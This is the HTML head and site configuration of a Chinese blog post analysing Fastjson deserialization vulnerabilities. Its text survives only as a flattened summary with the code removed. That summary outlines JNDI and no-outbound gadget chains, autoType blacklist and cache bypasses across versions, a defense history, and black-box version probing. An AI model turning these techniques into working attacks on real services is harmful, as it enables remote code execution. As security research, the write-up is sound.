<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Fastjson安全漏洞分析 | 高木のBlog</title><meta name="keywords" content="代码审计,网络安全,反序列化,Fastjson,JSON注入"><meta name="author" content="Takake"><meta name="copyright" content="Takake"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Fastjson安全漏洞分析"><meta name="application-name" content="Fastjson安全漏洞分析"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Fastjson安全漏洞分析"><meta property="og:url" content="https://blog.takake.com/posts/32163/index.html"><meta property="og:site_name" content="高木のBlog"><meta property="og:description" content="1.Fastjson分析1.1.fastjson常用方法首先需要明白JSON类的几个方法分别是，toJSONString，parse，parseObject(String text)，parseObject(String text, Class clazz)。  toJSONString 是将对象序"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/t01d2db9ae92fa8184f.png?x-oss-process=style/img-to-webp"><meta property="article:author" content="Takake"><meta property="article:tag" content="技术,OpenAI,网络安全,hacker,ChatGPT,人工智能,WEB渗透测试,黑客,分享,服务器,WEB安全,红队,蓝队,"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/t01d2db9ae92fa8184f.png?x-oss-process=style/img-to-webp"><meta name="description" content="1.Fastjson分析1.1.fastjson常用方法首先需要明白JSON类的几个方法分别是，toJSONString，parse，parseObject(String text)，parseObject(String text, Class clazz)。  toJSONString 是将对象序"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://blog.takake.com/posts/32163/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/cdn/lib/css/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"GPT-4.0-turbo","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3GpafT7n8yHKUbXT","LingQueMonitorID":"3GpatLJgdLFKhspS"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: 'https://takake.netlify.app/.netlify/functions/twikoo',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: {"mode":null,"api":null,"cover_change":true},
  authorStatus: {"skills":["🤖️ 人工智能爱好者","🔍 分享与热心帮助","🔨 删库跑路一条龙","🤝 网络安全从业者","🏃 脚踏实地行动派","🧱 团队小组发动机"]},
  algolia: {"appId":"6ECK9ICH9Y","apiKey":"4d7d6edad6ebd6c982ea423b6b573b1c","indexName":"my_hexo","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Takake","link":"链接: ","source":"来源: 高木のBlog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: true,
  shortcutKey: undefined,
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: '高木のBlog',
  title: 'Fastjson安全漏洞分析',
  postAI: '本章节对FastJson漏洞进行了详细的分析，其中包含了fastjson底层类的详细调用流程，以及各个版本的调用链Gadget分析，并且提到了各个版本如何进行绕过利用,最后提到了如何防御以及在黑盒情况下如何探测版本等。',
  pageFillDescription: '1.Fastjson分析, 1.1.fastjson常用方法, 1.2.调用流程分析, 1.3.JAVA反序列化和FastJSON反序列化的区别, 1.4.哪些Setter和Getterx2FisXxx方法会被执行？, Setter(), Getter()x2FisXxxx(), 1.5.注意事项, 2.打V1.2.24, 2.1.JdbcRowSetImpl, 2.1.1类分析, 2.1.2.POC分析, 2.1.3.流程分析, 2.1.4.总结, 2.1.5.思考, 2.2.TemplatesImpl（不出网利用）, 2.3. Becl （不出网利用）, 2.3.1.利用条件, 2.3.2.类分析, 2.3.3.PoC分析, 2.3.4.流程, 2.4.C3P0 (不出网利用), 2.4.1.利用条件, 2.4.1. 流程分析, 2.4.2.PoC编写, 3. 绕过技巧, 3.1. 1.2.47利用缓存绕过, 类加载的天然属性, 3.2. 1.2.41 Llt类名gt  绕过, 3.3. 1.2.42 双写LLlt类名gt 绕过, 3.4. 1.2.43 [lt类名gt 绕过, 3.5. 1.2.68 绕过, 3.5.1.当未主动开启autoType支持, 1.利用JDK11写文件, 2.利用commons-io写文件, 3.利用commons-io读文件, 3.5.2.主动开启autoType支持, 1.ShiroJNDI远程对象调用, 3.6. 1.2.76 - 1.2.80绕过, 3.6.1. groovy链, 3.6.2. 1.2.80的其他默认关闭autoType利用方式, 4. 防御阶段, 4.1.防御方案演进, 版本防御机制演变总览, 各阶段详细说明, 1. 无限制阶段（≤1.2.24）, 2. 黑名单阶段（1.2.25~1.2.47）, 3. 白名单优先阶段（1.2.48~1.2.67）, 4. 增强白名单阶段（1.2.68~1.2.82）, 5. SafeMode 阶段（1.2.83+）, 关键版本对比表, 总结, 5.黑盒测试中的版本探测, 1. 通过报错信息特征识别, (1) 利用AutoCloseable和异常JSON接口, 2. 通过特性支持差异探测, (1) 测试 Feature.SupportNonPublicField 支持, (2) 测试 autoTypeSupport 默认状态, 3. 利用版本独有特性, (1) 时间格式化差异, (2) 反序列化字节码支持（TemplatesImpl 链）, 4. 响应头与库路径泄露, (1) 观察 HTTP 响应头, (2) 触发类路径泄露, 5.出网探测, 6.正则延迟探测, 7.依赖探测, 8. 自动化探测工具, (1) FastjsonScan, (2) Burp Suite 插件, 版本判定对照表分析常用方法首先需要明白类的几个方法分别是是将对象序列化为字符串实现的是序列化操作调用的方法是将字符串反序列化对象实现的是反序列化操作调用的是方法是先调用方法进行反序列化操作调用方法再调用进行序列化操作调用方法是反序列化为指定的类而不会调用方法进行序列化操作因此只调用方法以上所有方法在默认请求下都可以通过注解指定反序列化的类调用流程分析那么我们来具体分析一下中通过指定后的调用流程首先是通过调用方法和方法去解析字符串去处理不同的数据结构然后通过类中的和来创建一个反序列用于之后的调用再通过类中的判断需要调用哪些方法然后通过该类的方法将将创建的添加到用于之后的调用之后再返回到方法通过调用方法依次进行反序列再通过方法依次通过反射调用的方法对属性进行赋值再执行完成方法后再回退到方法调用方法再调用和来创建序列化对象再使用和方法对需要调用的方法传入入到中用于之后的调用包含方法之后回退到方法中首先使用方法对之前创建的对象进行校验判断获取到的是否合法调用方法来获取中的值主要是通过方法依次对中生成的对象方法进行调用调用流程图反序列化和反序列化的区别通过流程分析我们可以判断反序列化其实是本质是通过反射来调用恶意的和方法来实现恶意的操作而在反序列化中主要是通过反序列化时调用来构造利用链实现恶意的操作因此存在本质的区别反序列化虽然也叫反序列化其实和反序列化不太沾边因为反序列化其实是对二进制数据进行操作的而反序列化是基于字符串进行操作的这点到有点像的反序列化原生反序列化需要实现接口反序列化不需要原生反序列化受影响反序列化受注解配置影响不过最后构造链后一般都是执行通过反射或者类加载反序列化和反序列化时如果反序列化的对象已经加载过则都不会调用静态代码块但是构造代码块反序列化不会调用而反序列化一定会调用哪些和方法会被执行通过流程分析我们可以从着手判断方法名的长度不能小于不能是静态方法返回类型为空或者是类本身参数类型必须只有一个对字段属性的注解注解配置了是否序列化方法名必须以开头的判断放在注解后面意思是允许非方法标记注解对属性名特殊字符的一些处理注解的一些内容注解配置了是否序列化注解配置名有就会进行序列化添加到列表的方法在方法的遍历中会将所有的方法进行调用即使没有设置值同样也会调用不能是静态方法返回类型不能为不能有参数返回值类型不能是类加载器排除特有的方法避免在环境中处理元编程相关的逻辑注解配置了是否序列化注解配置名有就会进行序列化方法名至少个字母方法名不能为方法名不能是并且是枚举类型判断第四个字符不能为特殊字母假如的很多的情况一下轮询时将大大降低效率字段名注解判断和上面一样属性名不能为空目前看来并不算判断常规方法的是否有这个属性方法长度不能小于返回类型只能是或者第三个字符不能是特殊字符方法注解判断属性名不能为空目前看来并不算判断常规方法的是否有这个属性优先选择如果已经包含过了就不添加了在中遍历执行所有添加到中的和方法注意事项只会根据方法名来对属性的值进行注入和属性的名无关想要对进行字段设置和进行方法调用只需要传输这样的串大小写都可以而不是也就是说方法调用只跟方法名有关和属性名无关而且不区分大小写方法的执行顺序先执行调用方法方法执行顺序是按字符串从前到后的顺序来的再调用调用方法是按方法的第四三个字母的码的顺序进行执行在中默认会遍历执行所有的方法即使没有为其赋值想要进入底层类调试需要配置一个也就是返回值为的方法避免其代码逻辑进入临时生成的类的逻辑从而无法调试打类分析在中有这样一个类是中一个内置的扩展类属于包的一部分它的核心作用是提供一种断开连接的实现允许开发者以更灵活的方式操作数据库数据而在该类中存在一个我们非常感兴趣的方法函数这个我相信大家都不陌生了在之间的注入分析我们利用的函数参数的注入链接远程链接远程工厂类实现类加载执行任意代码所以我们看到函数就应该兴奋起来看该方法是否可以调用参数是否可以控制我们先查看函数的参数是否可控函数的参数从这个方法中传入因此我们可以思考是否可以通过反序列化控制的返回值接下来我们来看到和方法因此通过观察这三个方法我们知道可以先通过调用方法对属性进行赋值然后的返回值就变成了我们控制的值符合反序列化注入的逻辑在父类中那么既然我们知道参数已经可控了那么接下来我们就要分析能否调用方法了通过对当前类的查找我们看到可以看到有三个方法调用了方法分别是且他们方法都为修饰那么我们最能能够直接观察到可利用的就是方法因为他们符合我们之前说的和方法可能可以利用可以看看其他的是否有调用他的这我就不分析了因为有其他更好利用的方法在这两个方法优先考虑肯定是是因为如果我们在中传入一个的值的话会优先调用方法会比方法优先调用且如果代码中使用的是方法去解析的的话则是不会解析方法的因此肯定考虑方法那么我们接下来观察方法通过观察的代码基本上可以确定是可以调用的通过对参数进行赋值就会调用的方法中分析我们一共需要调用两个方法我们首先通过对进行赋值由于方法的调用的顺序是串中考前的先调用因此我们先配置赋值在对赋值即可再强调一下的赋值只和方法名有关和属性值的属性名无关首先的值由于是函数且我的环境是版本因此使用或者或者使用探测都可以我这我了演示就使用服务器进行吧因此设置的值为然后是的值为任意整型或者类型即可因为整型和布尔型都可以过类型的参数检测不会报错中断线程还有一个最重要的参数自然是配置我们需要反序列化的类服务器部署编译恶意类在静态代码块中执行恶意代码启动服务器流程分析首先通过调用方法反射调用的方法对属性进行赋值然后进入到核心调用逻辑给进行赋值再反射调用方法的方法然后再调用方法中的函数远程服务器再调用远程的恶意类进行加载总结该链的主要逻辑就是通过调用原生的方法通过反序列化为首先调用方法进行传参然后再调用方法来调用函数调用远程的服务器实现注入思考有个问题那就是说既然再方法中会遍历调用所有的方法那按道理调用后不需要再方法因为在方法中还有一个方法那就是方法也调用了方法那么是否能在不调用的情况下通过自动调用方法执行远程代码这次我们不设置参数如下我们实践一下发现在执行代码前就抛出异常终止了当前线程我们调试一下看异常问题出在哪通过对代码调试我们发现在调用方法前调用方法使用过原生的连接数据的朋友都知道该方法是对查询的结果集向后走一个索引但是我们是我们并没有提供一个正确的链接因此肯定得不到结果集执行索引偏移肯定会报错所以没办法继续执行后面的代码所以这条路走不通不出网利用这条链我就不详细分析了因为之前在分析链的时候已经分析过这条链且只是原因之一最重要的原因还是这条链的利用范围太窄了需要在解析串的时候设置所以利用范围很低当然还有一个最根本的原因就是我懒得分析已经分析过了同时设置后系统不再调用方法因为需要设置私有属性的值因此主要是通过反射调用实现该条链中最主要的内容通过调用方法实现的不出网利用利用条件需要具有依赖类分析我们可以看到类中的方法该方法为我们提供了一个提议加载字节码的地方不过这部分字节码需要在前面加入的标识符即以及还需要传入一个类加载器因此我们现在的思路就是看和是否可控经过对当前类的查找我们找到以下方法因此两个参数都有对应的和方法我们可以直接通过反序列化进行赋值既然参数可控了接下来我们分析一下能否调用方法我们通过对当前类的查找看到了方法其中就调用了方法但是不是方法因此没办法进行调用我们再往上级查找发现当前类一共有首先我们先来考虑方法因为我们对字段进行赋值的化我们可以定义方法的执行顺序且方法会比方法先执行不过我们来看到该方法的参数时需要传入一个类型的对象而该对象没有默认的构造方法我们还需要对其进行传参因此实现起来会比较麻烦我们再尝试看看方法方法因为方法没办法定义顺序顺序因此我们有限看码靠前的方法我们看到方法直接就调用了方法因此这是以恶好方法只要保证当前类的码之前的方法执行时不会抛出无法处理的异常则可以正常执行到实现类加载分析首先我们需要先获得一个格式字节码字符串直接利用读文件将本地的恶意类加载并且进行编码格式化接下来我们就是需要设置和的值构造如下流程首先通过指定执行需要反序列化的类然后分别配置和值然后在中调用方法再调用方法实现的类加载不出网利用利用条件要求版本不高于且系统存在可利用的反序列化攻击链流程分析的利用链很简单虽然说发现这条链的人或者团队肯定耗费了大量时间但是其实利用起来很简单只需要调用一个方法即可通过调用的其实是调用父类抽象类的方法同时给唯一参数赋值值为我们要攻击的反序列化对象任意可用的反序列化链即可例如链然后将其转换为字符串即可攻击流程我们大概清楚了那么我们来分析一下具体的调用细节调用父类中的中的问题调用调用解析传入的字符串调用解析传入的字符串调用转换为二进制数据调用完成最终二次反序列化调用堆栈编写首先准备一个调用链例如可以手写或者利用直接生成一个方式一手写写入文件将生成的序列化文件转换为字符串方式二或者将以前生成的反序列文件通过进行转换选择任意方式均可构造完整绕过技巧在版本之后系统在反序列化类时在中添加了一个的方法用于过滤一些恶意的反序列化从版本开始默认情况下功能是关闭的需要手动开启才能通过字段指定任意类进行反序列化但是无论开启以及关闭都不影响我们利用缓存绕过因此目前最主要的问题就是绕过这个方法进行反序列化利用利用缓存绕过其中一个关键点就是参数开启白名单优先关闭黑名单优先之后默认情况为关闭即黑名单优先原则无论开启与否都不影响利用缓存绕过方法分析这个就是在反序列化时配置预期加载的类通常我们是没办法控制的所以就别想了是否在白名单中若类名匹配任意白名单前缀直接加载类开启默认白名单优先原则在两个缓存中找是否有如果有则直接返回该类关闭时默认黑名单优先原则默认黑名单类目前能够比较好绕过的就是从缓存找类的方式只要我们提前将我们的类写入缓存表中那就可以绕过这个方法的检测从中查找是否存在该类那么接下来我们的目标就是如果通过将我们的恶意类加载进行缓存表中那么我们可以通过查找方法那查看哪些可控方法可以使用通过查找我们可以看到我们的老朋友类之前见到它的时候还是遍历方法的时候在这个类中存在一个方法而该方法就调用了方法将插入到中为我们绕过提供了条件写入我们又可以找到这个类中又调用了而本身是个反序列化器且会在初始化时进行配置也就是说当类型或者下面的这些类类型反序列化时都会调用这个反序列化器而调用这个返序列化器就会将对应的反序列化的类写入到中那么只要需要使用这些类去加载这些类加载器去加载我们的恶意类就好了提前加载了这个恶意类加载到中到在中去查找缓存的时候就会返回从而绕过黑白名单检测机制那么接下来就是具体的绕过实际的编写了首先我们选择一个我们要反序列化的类我们要使用的反序列化器是因此我们在以上的类型中寻找一个例如我们可以选择属于类型且是自带的类然后我们需要设置的值为什么是设置的值呢因为类的代码实现就是将的值使用进行类加载为什么不选择其他类型类加载的天然属性是反射的核心类其反序列化逻辑天然支持通过字段值如动态加载类名而其他类如的反序列化逻辑仅处理自身数据结构不涉及类加载例如反序列化只会生成一个对象而不会将任何新类名存入缓存如下这样我们就可以将写入到缓存中再次调用方法来检测恶意类的时候发现缓存中存在这个类就会直接返回缓存加载流程反序列化处理使用反序列化器处理类型调用解析值对应的类名并将该类加载到缓存中时默认缓存缓存写入此时被存入全局缓存后续可直接读取之后的逻辑就和之前一样了将之前的逻辑结合起来如下其他利用缓存绕过原理类似二次反序列化总结利用默认的反序列化器去反序列化加载然后通过设置值将我们要执行的恶意类提前通过方法提前加载到中这样当我们再次去反序列化调用并在方法中进行检测时会在中去查找由于我们的提前注入就会绕过黑白名单检测直接返回我们想要执行的恶意类由于该利用是在黑白名单和检测之前就已经返回了因此不需要目标服务器手动开启支持并且在版本之间的其他绕过例如绕过黑名单都需要手动开启后才能利用否则无法利用类名绕过在版本中在未开启支持时仅支持利用白名单过滤白名单优先因此无法争对黑名单进行绕过因此在争对黑名单绕过都需要开启支持利用在方法中删除和的机制进行黑名单绕过构造为双写类名绕过递归去除类名中的和构造类名绕过构造绕过当未主动开启支持当未主动开启支持时想要实现利用必须仅在默认配置的白名单中进行反序列利用否则会被拦截从而无法利用以下是一些是部分白名单所有想要绕过是比较有难度的事情不过也并不是完全没有办法基本类型包装类集合接口仅限接口非实现类日期类结构类内置序列化接口利用写文件利用写文件文件大小需要以上才能正确写入且在利用读文件需要用到主动开启支持远程对象调用链当系统开启支持的时候我们可以通过绕过黑名单的方式来实现注入但是需要目标系统具有依赖且版本小于等于攻击者绕过链该链主要是通过的依赖实现加载远程包无需主动开启即可利用需要发送两个请求远程包如何编写参考的写法的其他默认关闭利用方式利用结合进行文件读写当然这些利用方式更偏向与白盒黑盒的化只能用扫描器跑了毕竟在没有源码的情况下很难完整的判断系统是否具有对应依赖甚至是对应版本因此黑河只能是要扫描器进行扫描具体利用方式我就不一一去分析了可以参考下面这个项目进行学习防御阶段防御方案演进以下是防御机制的版本演变总结涵盖默认配置变化开关黑白名单和关键安全特性的演进版本防御机制演变总览版本范围默认状态防御机制关键特性漏洞开启无限制无黑名单白名单完全无防护可任意反序列化类高发默认关闭黑名单拦截首次引入黑名单但存在缓存绕过漏洞如默认关闭白名单优先黑名单兜底修复缓存漏洞强制白名单校验默认关闭增强白名单通配符支持扩展默认白名单修复历史漏洞默认关闭安全模式彻底禁用功能杜绝反序列化攻击各阶段详细说明无限制阶段默认状态开启无显式配置等效于防御机制无黑名单或白名单允许任意类通过反序列化风险可直接加载任意类如导致远程代码执行黑名单阶段默认状态关闭防御机制黑名单拦截高危类如等白名单未明确配置仅允许部分基础类型如漏洞缓存绕过漏洞通过预加载恶意类至缓存绕过黑名单安全建议升级至避免使用白名单优先阶段默认状态关闭防御机制白名单优先校验即使开启也必须匹配白名单或手动添加信任路径黑名单兜底拦截已知高危类默认白名单少量核心类如修复内容修复缓存绕过漏洞将加入黑名单限制白名单范围较窄需手动扩展业务相关类增强白名单阶段默认状态关闭防御机制扩展默认白名单包含更多内置类如支持通配符允许配置包路径如安全改进修复历史漏洞如链的利用限制优化黑名单覆盖范围阶段默认状态关闭新增防御机制安全模式通过开启后完全禁用功能任何包含的字符串均抛出异常默认白名单进一步精简仅保留最安全的核心类设计目标彻底杜绝反序列化攻击适用于高安全场景关键版本对比表版本默认默认黑名单默认白名单支持开启关闭关闭关闭关闭扩展关闭精简总结无限制阶段完全开放风险最高黑名单阶段基础防御存在绕过漏洞白名单阶段逐步强化修复历史漏洞阶段终极防御彻底禁用始终遵循最小化信任原则避免依赖的默认配置应对高风险场景黑盒测试中的版本探测在渗透测试或安全评估中探测目标使用的版本是评估反序列化漏洞风险的关键步骤以下是在黑盒环境中常用的探测方法及其原理通过报错信息特征识别通过报错信息识别需要服务端配置报错显示利用和异常接口版本特征返回版本信息但是不一定准确可能返回版本信息降级例如版本可能返回可能是版本利用参数触发黑名单拦截版本特征返回但可能暴露黑名单机制返回更具体的错误信息如通过特性支持差异探测测试支持尝试反序列化非公有字段版本特征无防护直接加载类触发缓存绕过漏洞若成功加载可能返回连接错误返回测试默认状态尝试加载非白名单类版本特征关闭返回关闭同上但错误信息更明确若目标开启可能返回类不存在或依赖错误如利用类进行返回特征如果成功回显表示开启回显失败表示关闭利用版本独有特性时间格式化差异发送不同格式的日期字符串版本特征支持日期格式需开启旧版本可能解析失败或返回默认格式反序列化字节码支持链构造字段的恶意需开启版本特征直接执行字节码默认拦截响应头与库路径泄露观察响应头特征某些框架集成后错误响应头可能包含库信息触发类路径泄露利用反序列化错误触发类加载器信息响应特征返回返回出网探测利用进行出网探测不同版本的探测正则延迟探测在目标无法出网时且无报错信息时我们可以利用正则表达式来进行延迟探测返回特征当版本在版本之间时产生延时响应否则不产生延迟响应依赖探测利用类和畸形进行依赖探测探测依赖是否存在可将依赖更换为不同依赖类路径进行探测返回特征具有依赖时自动化探测工具功能批量检测版本及漏洞命令插件插件推荐或支持被动扫描版本判定对照表探测特征可能版本无防护直接执行缓存绕过漏洞有效返回支持需显式开启',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-05-08 20:19:18',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 8 || hour >= 22
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">高木のBlog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a><div id="he-plugin-simple"></div><script>var WIDGET = {
  "CONFIG": {
    "modules": "0124",
    "background": "2",
    "tmpColor": "FFFFFF",
    "tmpSize": "16",
    "cityColor": "FFFFFF",
    "citySize": "16",
    "aqiColor": "E8D87B",
    "aqiSize": "16",
    "weatherIconSize": "24",
    "alertIconSize": "18",
    "padding": "10px 10px 10px 10px",
    "shadow": "0",
    "language": "auto",
    "borderRadius": "20",
    "fixed": "true",
    "vertical": "top",
    "horizontal": "left",
    "left": "10",
    "top": "7.1",
    "key": "df245676fb434a0691ead1c63341cd94"
  }
}
</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a 